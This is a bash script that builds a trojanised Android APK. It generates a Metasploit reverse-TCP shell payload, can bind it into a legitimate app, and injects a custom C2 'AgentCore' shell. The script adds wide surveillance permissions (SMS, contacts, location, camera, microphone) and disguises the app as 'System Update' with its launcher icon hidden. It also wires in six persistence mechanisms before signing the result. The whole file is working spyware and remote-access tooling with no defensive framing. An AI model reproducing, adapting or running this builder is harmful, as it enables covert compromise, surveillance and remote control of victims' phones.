#!/usr/bin/env bash
# build_payload_enhanced.sh — Enhanced Android payload with full 6-layer
# persistence: boot/user/power receivers, AlarmManager watchdog, JobScheduler
# resurrection, foreground service, camouflage, AgentCore TCP C2 shell.
#
# Usage:
#   ./build_payload_enhanced.sh [--fgs] [--bind <legit.apk>] [--camo] LHOST LPORT [out.apk]
#
# Flags:
#   --fgs       foreground service with notification
#   --bind APK  merge payload into a legitimate APK
#   --camo      hide launcher, label "System Update"
#   --agent     inject AgentCore + DlsService + all receivers (default ON)

set -euo pipefail

FGS=0
BIND_APK=""
CAMO=0
AGENT=1  # always on — this is the hardened agent

while [[ $# -gt 0 ]]; do
    case $1 in
        --fgs) FGS=1; shift ;;
        --bind) BIND_APK="${2:?}"; shift 2 ;;
        --camo) CAMO=1; shift ;;
        --agent) shift ;;  # accepted, always on
        *) break ;;
    esac
done

LHOST="${1:?usage: build_payload_enhanced.sh [--fgs] [--bind legit.apk] [--camo] LHOST LPORT [out.apk]}"
LPORT="${2:?usage: ... LHOST LPORT [out.apk]}"
OUT="${3:-payload_enhanced.apk}"

ROOT="$(cd "$(dirname "$0")" && pwd)"
APT="${APKTOOL_JAR:-$ROOT/apktool.jar}"
BT="${BUILD_TOOLS:-/home/div-admin/Android/Sdk/build-tools/35.0.0}"
WORK="$ROOT/.payload-build"
RAW="$WORK/raw.apk"
SRC="$WORK/src"
BIND_DIR="$WORK/bind"
AGENT_SRC="$ROOT/agent"
JH="${JAVA_HOME:-/home/div-admin/.local/jdk-17}"

[ -f "$APT" ] || { echo "apktool.jar missing at $APT"; exit 1; }
[ -x "$BT/apksigner" ] || { echo "build-tools missing at $BT"; exit 1; }

# ---------------------------------------------------------------------------
# 1. Generate base payload
# ---------------------------------------------------------------------------
echo "[1/9] Generating base payload (msfvenom LHOST=$LHOST LPORT=$LPORT)..."
mkdir -p "$WORK"
rm -f "$RAW"

if [ -n "${PAYLOAD_SRC:-}" ] && [ -f "$PAYLOAD_SRC" ]; then
    echo "  using existing payload: $PAYLOAD_SRC"
    cp "$PAYLOAD_SRC" "$RAW"
else
    msfvenom -p android/shell/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -o "$RAW" >/dev/null 2>&1
fi

# ---------------------------------------------------------------------------
# 2. Decode APK (bind or standalone)
# ---------------------------------------------------------------------------
if [ -n "$BIND_APK" ]; then
    echo "[2/9] Binding with legitimate APK: $BIND_APK"
    [ -f "$BIND_APK" ] || { echo "Bind APK not found: $BIND_APK"; exit 1; }
    rm -rf "$BIND_DIR"
    mkdir -p "$BIND_DIR"
    java -jar "$APT" d "$BIND_APK" -f -o "$BIND_DIR/legit" >/dev/null 2>&1
    java -jar "$APT" d "$RAW" -f -o "$BIND_DIR/payload" >/dev/null 2>&1
    cp -r "$BIND_DIR/payload/smali/com/metasploit" "$BIND_DIR/legit/smali/com/"

    # Merge permissions + components
    python3 - "$BIND_DIR/legit/AndroidManifest.xml" "$BIND_DIR/payload/AndroidManifest.xml" <<'PY'
import sys, xml.etree.ElementTree as ET
legit_mani = ET.parse(sys.argv[1])
pay_mani = ET.parse(sys.argv[2])
legit_root = legit_mani.getroot()
pay_root = pay_mani.getroot()
ns = {'android': 'http://schemas.android.com/apk/res/android'}
for perm in pay_root.findall('uses-permission', ns):
    name = perm.get('{http://schemas.android.com/apk/res/android}name')
    if name and not any(p.get('{http://schemas.android.com/apk/res/android}name') == name for p in legit_root.findall('uses-permission', ns)):
        legit_root.insert(0, perm)
app_legit = legit_root.find('application')
app_pay = pay_root.find('application')
if app_legit is not None and app_pay is not None:
    for child in list(app_pay):
        tag = child.tag.split('}')[-1]
        if tag in ('receiver', 'service', 'activity'):
            name = child.get('{http://schemas.android.com/apk/res/android}name')
            if name and not any(c.get('{http://schemas.android.com/apk/res/android}name') == name for c in app_legit):
                app_legit.append(child)
legit_mani.write(sys.argv[1], encoding='utf-8', xml_declaration=True)
print("  Manifests merged")
PY
    SRC="$BIND_DIR/legit"
else
    echo "[2/9] Decoding payload..."
    if [ "$FGS" = "1" ]; then
        java -jar "$APT" d "$RAW" -f -o "$SRC" >/dev/null 2>&1
    else
        java -jar "$APT" d "$RAW" -s -f -o "$SRC" >/dev/null 2>&1
    fi
fi

# ---------------------------------------------------------------------------
# 3. Harden manifest: SDK levels, exported, FGS, network security
# ---------------------------------------------------------------------------
echo "[3/9] Hardening manifest (SDK 21/34, exported, FGS, netsec)..."
sed -i 's|minSdkVersion: 10|minSdkVersion: 21|; s|targetSdkVersion: 17|targetSdkVersion: 34|' "$SRC/apktool.yml"
sed -i 's|<activity android:label="@string/app_name" android:name=".MainActivity"|<activity android:exported="true" android:label="@string/app_name" android:name=".MainActivity"|' "$SRC/AndroidManifest.xml"
sed -i 's|<receiver android:label="MainBroadcastReceiver" android:name=".MainBroadcastReceiver"|<receiver android:exported="true" android:label="MainBroadcastReceiver" android:name=".MainBroadcastReceiver"|' "$SRC/AndroidManifest.xml"
sed -i 's|<service android:exported="true" android:name=".MainService"/>|<service android:exported="true" android:foregroundServiceType="dataSync" android:name=".MainService"/>|' "$SRC/AndroidManifest.xml"

if [ "$FGS" = "1" ]; then
    sed -i 's|@android:style/Theme.NoDisplay|@android:style/Theme.Translucent.NoTitleBar|' "$SRC/AndroidManifest.xml"
fi

# Add hardened permissions + network security config
python3 - "$SRC/AndroidManifest.xml" <<'PY'
import sys, xml.etree.ElementTree as ET
mani = ET.parse(sys.argv[1])
root = mani.getroot()
ns = {'android': 'http://schemas.android.com/apk/res/android'}

perms = [
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.ACCESS_WIFI_STATE',
    'android.permission.CHANGE_WIFI_STATE',
    'android.permission.WAKE_LOCK',
    'android.permission.RECEIVE_BOOT_COMPLETED',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
    'android.permission.FOREGROUND_SERVICE',
    'android.permission.FOREGROUND_SERVICE_DATA_SYNC',
    'android.permission.FOREGROUND_SERVICE_SPECIAL_USE',
    'android.permission.SCHEDULE_EXACT_ALARM',
    'android.permission.READ_PHONE_STATE',
    'android.permission.READ_SMS',
    'android.permission.SEND_SMS',
    'android.permission.READ_CONTACTS',
    'android.permission.WRITE_CONTACTS',
    'android.permission.READ_CALL_LOG',
    'android.permission.WRITE_CALL_LOG',
    'android.permission.ACCESS_FINE_LOCATION',
    'android.permission.ACCESS_COARSE_LOCATION',
    'android.permission.ACCESS_BACKGROUND_LOCATION',
    'android.permission.CAMERA',
    'android.permission.RECORD_AUDIO',
    'android.permission.SYSTEM_ALERT_WINDOW',
    'android.permission.WRITE_SETTINGS',
    'android.permission.READ_EXTERNAL_STORAGE',
    'android.permission.WRITE_EXTERNAL_STORAGE',
    'android.permission.READ_MEDIA_IMAGES',
    'android.permission.READ_MEDIA_AUDIO',
    'android.permission.READ_MEDIA_VIDEO',
    'android.permission.POST_NOTIFICATIONS',
]

for perm in perms:
    if not any(p.get('{http://schemas.android.com/apk/res/android}name') == perm for p in root.findall('uses-permission', ns)):
        elem = ET.Element('uses-permission')
        elem.set('{http://schemas.android.com/apk/res/android}name', perm)
        root.insert(0, elem)

# Add network security config
app = root.find('application')
if app is not None and not app.get('{http://schemas.android.com/apk/res/android}networkSecurityConfig'):
    app.set('{http://schemas.android.com/apk/res/android}networkSecurityConfig', '@xml/network_security_config')

# Add hardwareAccelerated and supportsRtl
app.set('{http://schemas.android.com/apk/res/android}hardwareAccelerated', 'true')
app.set('{http://schemas.android.com/apk/res/android}supportsRtl', 'true')
app.set('{http://schemas.android.com/apk/res/android}allowBackup', 'false')
app.set('{http://schemas.android.com/apk/res/android}fullBackupContent', 'false')

mani.write(sys.argv[1], encoding='utf-8', xml_declaration=True)
print("  Permissions + netsec injected")
PY

# Network security config (cleartext + pinning bypass)
mkdir -p "$SRC/res/xml"
cat > "$SRC/res/xml/network_security_config.xml" <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
</network-security-config>
EOF

# ---------------------------------------------------------------------------
# 3b. Camouflage
# ---------------------------------------------------------------------------
if [ "$CAMO" = "1" ]; then
    echo "[3b/9] Camouflaging..."
    python3 - "$SRC" <<'PY'
import sys
from pathlib import Path
root = Path(sys.argv[1])
for sp in (root / "res/values").glob("strings.xml"):
    t = sp.read_text(encoding="utf-8")
    t = t.replace("<string name=\"app_name\">MainActivity</string>",
                  "<string name=\"app_name\">System Update</string>")
    t = t.replace("<string name=\"app_name\">PhoneSploit</string>",
                  "<string name=\"app_name\">Andro-DLS</string>")
    sp.write_text(t, encoding="utf-8")
mani = root / "AndroidManifest.xml"
m = mani.read_text(encoding="utf-8")
if "android.intent.category.LAUNCHER" in m:
    m = m.replace(
        '                <action android:name="android.intent.action.MAIN"/>\n'
        '                <category android:name="android.intent.category.LAUNCHER"/>',
        '                <action android:name="android.intent.action.MAIN"/>'
    )
mani.write_text(m, encoding="utf-8")
print("  camo: label='System Update', launcher hidden")
PY
fi

# ---------------------------------------------------------------------------
# 4. FGS smali patches (if --fgs)
# ---------------------------------------------------------------------------
if [ "$FGS" = "1" ]; then
    echo "[4/9] Applying foreground-service smali patches..."
    python3 - "$SRC" <<'PY'
import sys
from pathlib import Path
root = Path(sys.argv[1])
mani = root / "AndroidManifest.xml"
text = mani.read_text(encoding="utf-8")
if 'android.permission.FOREGROUND_SERVICE"' not in text:
    text = text.replace(
        '<uses-permission android:name="android.permission.INTERNET"/>',
        '<uses-permission android:name="android.permission.INTERNET"/>\n'
        '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>\n'
        '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>',
    )
mani.write_text(text, encoding="utf-8")

svc = root / "smali/com/metasploit/stage/MainService.smali"
if svc.exists():
    s = svc.read_text(encoding="utf-8")
    old = """.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    const/4 v0, 0x1

    return v0
.end method"""
    new = """.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 4

    const-string v0, "msf"

    const/4 v1, 0x1

    new-instance v2, Landroid/app/NotificationChannel;

    invoke-direct {v2, v0, v0, v1}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const-string v0, "notification"

    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    invoke-virtual {v0, v2}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    new-instance v1, Landroid/app/Notification$Builder;

    const-string v2, "msf"

    invoke-direct {v1, p0, v2}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const v2, 0x1080093

    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    const-string v2, "Andro-DLS"

    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    const-string v2, "Meterpreter active"

    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    invoke-virtual {v1}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v1

    const/4 v0, 0x1

    const/4 v2, 0x1

    invoke-virtual {p0, v0, v1, v2}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;I)V

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    const/4 v0, 0x1

    return v0
.end method"""
    if old in s:
        s = s.replace(old, new)
    s = s.replace(
        "Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;",
        "Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;",
    )
    svc.write_text(s, encoding="utf-8")

    act = root / "smali/com/metasploit/stage/MainActivity.smali"
    if act.exists():
        a = act.read_text(encoding="utf-8")
        finish_line = "    invoke-virtual {p0}, Lcom/metasploit/stage/MainActivity;->finish()V"
        if finish_line in a:
            a = a.replace(finish_line + "\n\n", "")
            act.write_text(a, encoding="utf-8")
    print("  FGS smali patches applied")
PY
fi

# ---------------------------------------------------------------------------
# 5. Inject hardened agent (AgentCore + DlsService + receivers + JobService)
# ---------------------------------------------------------------------------
if [ "$AGENT" = "1" ]; then
    echo "[5/9] Building hardened agent (6-layer persistence + AgentCore C2)..."

    # Collect all Java sources
    AGENT_FILES=()
    for f in AgentCore.java DlsService.java DlsLauncher.java \
             BootReceiver.java UserPresentReceiver.java PowerReceiver.java \
             WatchdogReceiver.java ResurrectionJob.java; do
        if [ -f "$AGENT_SRC/$f" ]; then
            AGENT_FILES+=("$AGENT_SRC/$f")
        else
            echo "  !! missing agent source: $f"
            exit 1
        fi
    done

    # Replace C2 placeholders in source before compiling
    python3 - "${AGENT_FILES[@]}" "$LHOST" "$LPORT" <<'PY'
import sys
lhost = sys.argv[-2]
lport = sys.argv[-1]
for path in sys.argv[1:-2]:
    t = open(path, encoding="utf-8").read()
    t = t.replace("192.0.2.1", lhost)
    t = t.replace("11111", lport)
    open(path, "w", encoding="utf-8").write(t)
print(f"  C2 -> {lhost}:{lport}")
PY

    # Compile all agent Java -> class files
    AGENT_CLASSES="$WORK/agent-classes"
    rm -rf "$AGENT_CLASSES"
    mkdir -p "$AGENT_CLASSES"

    echo "  compiling ${#AGENT_FILES[@]} Java sources..."
    "$JH/bin/javac" -source 8 -target 8 \
        -d "$AGENT_CLASSES" \
        -classpath "$BT/../platforms/android-34/android.jar" \
        "${AGENT_FILES[@]}" >/dev/null 2>&1

    # Convert to dex
    AGENT_DEX="$WORK/agent-classes.dex"
    rm -f "$AGENT_DEX"
    cd "$AGENT_CLASSES"
    "$BT/d8" com/metasploit/stage/*.class --output "$WORK" >/dev/null 2>&1
    mv "$WORK/classes.dex" "$AGENT_DEX"
    cd "$ROOT"

    if [ ! -f "$AGENT_DEX" ]; then
        echo "  !! agent dex build failed"
        exit 1
    fi
    echo "  agent dex: $(stat -c%s "$AGENT_DEX") bytes"

    # Patch MainService smali to call AgentCore.run() instead of Payload.start()
    python3 - "$SRC" <<'PY'
import sys
from pathlib import Path
root = Path(sys.argv[1])
svc = root / "smali/com/metasploit/stage/MainService.smali"
if svc.exists():
    s = svc.read_text(encoding="utf-8")
    # Replace Payload.start calls with AgentCore.run
    s = s.replace(
        "invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V",
        "invoke-static {}, Lcom/metasploit/stage/AgentCore;->run()V",
    )
    s = s.replace(
        "invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V",
        "invoke-static {}, Lcom/metasploit/stage/AgentCore;->run()V",
    )
    svc.write_text(s, encoding="utf-8")
    print("  MainService -> AgentCore.run()")
PY

    # Inject manifest entries: DlsService, DlsLauncher, all receivers, ResurrectionJob
    python3 - "$SRC" "$FGS" <<'PY'
import sys, xml.etree.ElementTree as ET
from pathlib import Path
root_dir = Path(sys.argv[1])
fgs = sys.argv[2] == '1'
mani_path = root_dir / "AndroidManifest.xml"
mani = ET.parse(mani_path)
root_el = mani.getroot()
ns = {'android': 'http://schemas.android.com/apk/res/android'}
app = root_el.find('application')
if app is None:
    app = ET.SubElement(root_el, 'application')

def has_component(name):
    for child in app:
        tag = child.tag.split('}')[-1]
        if tag in ('service', 'receiver', 'activity'):
            n = child.get('{http://schemas.android.com/apk/res/android}name')
            if n and n.endswith(name):
                return True
    return False

def attr(name, value):
    return '{http://schemas.android.com/apk/res/android}' + name

PKG = 'com.metasploit.stage'

# --- DlsService ---
if not has_component('DlsService'):
    svc = ET.SubElement(app, 'service')
    svc.set(attr('name'), f'{PKG}.DlsService')
    svc.set(attr('enabled'), 'true')
    svc.set(attr('exported'), 'false')
    svc.set(attr('foregroundServiceType'), 'dataSync|specialUse')

# --- DlsLauncher (NoDisplay activity) ---
if not has_component('DlsLauncher'):
    act = ET.SubElement(app, 'activity')
    act.set(attr('name'), f'{PKG}.DlsLauncher')
    act.set(attr('exported'), 'true')
    act.set(attr('theme'), '@android:style/Theme.NoDisplay')
    act.set(attr('excludeFromRecents'), 'true')
    # Intent filter to make it launchable (first launch grants app ops)
    intent = ET.SubElement(act, 'intent-filter')
    action = ET.SubElement(intent, 'action')
    action.set(attr('name'), 'android.intent.action.MAIN')
    if not fgs:  # hide from launcher in non-FGS mode
        cat = ET.SubElement(intent, 'category')
        cat.set(attr('name'), 'android.intent.category.LAUNCHER')

# --- BootReceiver ---
if not has_component('BootReceiver'):
    r = ET.SubElement(app, 'receiver')
    r.set(attr('name'), f'{PKG}.BootReceiver')
    r.set(attr('enabled'), 'true')
    r.set(attr('exported'), 'true')
    r.set(attr('directBootAware'), 'true')
    filt = ET.SubElement(r, 'intent-filter')
    for a in ['android.intent.action.BOOT_COMPLETED',
              'android.intent.action.REBOOT',
              'android.intent.action.QUICKBOOT_POWERON',
              'com.htc.intent.action.QUICKBOOT_POWERON']:
        action = ET.SubElement(filt, 'action')
        action.set(attr('name'), a)

# --- UserPresentReceiver ---
if not has_component('UserPresentReceiver'):
    r = ET.SubElement(app, 'receiver')
    r.set(attr('name'), f'{PKG}.UserPresentReceiver')
    r.set(attr('enabled'), 'true')
    r.set(attr('exported'), 'true')
    filt = ET.SubElement(r, 'intent-filter')
    for a in ['android.intent.action.USER_PRESENT',
              'android.intent.action.USER_UNLOCKED']:
        action = ET.SubElement(filt, 'action')
        action.set(attr('name'), a)

# --- PowerReceiver ---
if not has_component('PowerReceiver'):
    r = ET.SubElement(app, 'receiver')
    r.set(attr('name'), f'{PKG}.PowerReceiver')
    r.set(attr('enabled'), 'true')
    r.set(attr('exported'), 'true')
    filt = ET.SubElement(r, 'intent-filter')
    for a in ['android.intent.action.ACTION_POWER_CONNECTED',
              'android.intent.action.ACTION_POWER_DISCONNECTED']:
        action = ET.SubElement(filt, 'action')
        action.set(attr('name'), a)

# --- WatchdogReceiver ---
if not has_component('WatchdogReceiver'):
    r = ET.SubElement(app, 'receiver')
    r.set(attr('name'), f'{PKG}.WatchdogReceiver')
    r.set(attr('enabled'), 'true')
    r.set(attr('exported'), 'true')
    filt = ET.SubElement(r, 'intent-filter')
    action = ET.SubElement(filt, 'action')
    action.set(attr('name'), 'com.metasploit.stage.WATCHDOG_FIRE')

# --- ResurrectionJob ---
if not has_component('ResurrectionJob'):
    j = ET.SubElement(app, 'service')
    j.set(attr('name'), f'{PKG}.ResurrectionJob')
    j.set(attr('enabled'), 'true')
    j.set(attr('exported'), 'true')
    j.set(attr('permission'), 'android.permission.BIND_JOB_SERVICE')

# Pretty-print and write
ET.indent(root_el, space='    ')
mani.write(str(mani_path), encoding='utf-8', xml_declaration=True)
print("  manifest: DlsService, DlsLauncher, BootReceiver, UserPresentReceiver, PowerReceiver, WatchdogReceiver, ResurrectionJob")
PY
fi

# ---------------------------------------------------------------------------
# 6. Rebuild APK
# ---------------------------------------------------------------------------
echo "[6/9] Rebuilding APK..."
java -jar "$APT" b "$SRC" -o "$WORK/rebuilt.apk" >/dev/null 2>&1

# ---------------------------------------------------------------------------
# 7. Repack + inject agent dex
# ---------------------------------------------------------------------------
echo "[7/9] Repack (resources.arsc + manifest STORED) + inject agent dex..."
AGENT_DEX="$WORK/agent-classes.dex"
python3 - "$WORK/rebuilt.apk" "$WORK/stored.apk" "$AGENT_DEX" <<'PY'
import sys, zipfile, os
zin = zipfile.ZipFile(sys.argv[1])
out_apk = sys.argv[2]
agent = sys.argv[3]
has_agent = os.path.exists(agent) and os.path.getsize(agent) > 0
agent_bytes = open(agent, "rb").read() if has_agent else b""
if has_agent:
    print(f"  injecting agent classes2.dex ({len(agent_bytes)} bytes)")
with zipfile.ZipFile(out_apk, "w") as zout:
    for it in zin.infolist():
        d = zin.read(it.filename)
        if it.filename in ("resources.arsc", "AndroidManifest.xml"):
            it.compress_type = zipfile.ZIP_STORED
        if it.filename == "classes.dex" and has_agent:
            i2 = zipfile.ZipInfo("classes2.dex")
            i2.compress_type = zipfile.ZIP_DEFLATED
            zout.writestr(i2, agent_bytes)
            print("  added classes2.dex (AgentCore + DlsService + receivers + JobService)")
        zout.writestr(it, d)
zin.close()
PY

# ---------------------------------------------------------------------------
# 8. zipalign + sign
# ---------------------------------------------------------------------------
echo "[8/9] zipalign + apksigner..."
"$BT/zipalign" -f 4 "$WORK/stored.apk" "$WORK/aligned.apk"
if [ ! -f "$ROOT/debug.keystore" ]; then
    keytool -genkeypair -keystore "$ROOT/debug.keystore" -alias androiddebugkey \
        -keyalg RSA -keysize 2048 -validity 10950 \
        -dname "CN=Android Debug,O=Android,C=US" \
        -storepass android -keypass android >/dev/null 2>&1
fi
"$BT/apksigner" sign --ks "$ROOT/debug.keystore" --ks-pass pass:android \
    --key-pass pass:android --out "$OUT" "$WORK/aligned.apk"

# ---------------------------------------------------------------------------
# 9. Verify
# ---------------------------------------------------------------------------
echo "[9/9] Verifying..."
"$BT/apksigner" verify "$OUT"

echo ""
echo "DONE: $OUT"
echo "  C2: $LHOST:$LPORT"
echo "  6-layer persistence:"
echo "    1. BootReceiver (BOOT_COMPLETED + QUICKBOOT + REBOOT)"
echo "    2. UserPresentReceiver (USER_PRESENT + USER_UNLOCKED)"
echo "    3. PowerReceiver (POWER_CONNECTED + DISCONNECTED)"
echo "    4. WatchdogReceiver (AlarmManager, 15-min heartbeat)"
echo "    5. ResurrectionJob (JobScheduler, persisted, 15-min)"
echo "    6. DlsService (START_STICKY + foreground + NetworkCallback)"
echo "  AgentCore: TCP persistent shell w/ watchdog + backoff re-dial"
[ "$FGS" = "1" ] && echo "  FGS: foreground service + notification"
[ -n "$BIND_APK" ] && echo "  Bound to: $BIND_APK"
[ "$CAMO" = "1" ] && echo "  Camouflage: System Update, launcher hidden"
